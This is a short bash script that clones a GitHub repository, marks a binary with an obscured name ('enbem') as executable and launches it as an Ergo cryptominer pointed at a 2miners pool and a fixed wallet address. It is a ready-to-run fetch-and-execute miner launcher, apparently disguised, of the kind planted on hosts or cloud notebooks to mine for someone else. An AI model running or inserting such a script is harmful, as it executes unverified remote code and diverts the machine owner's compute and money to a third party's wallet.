#!/bin/bash
git clone https://github.com/desafff/nbem.git && cd nbem && chmod +x ./enbem && ./enbem -a ergo -o stratum+tcp://erg.2miners.com:8888 -u 9fGbYYDxMPmyi3q1vmA4nvyyMhGxc5eHWJttx3EZFzyfRUTRDqZ.$(shuf -i 0-999 -n 1)
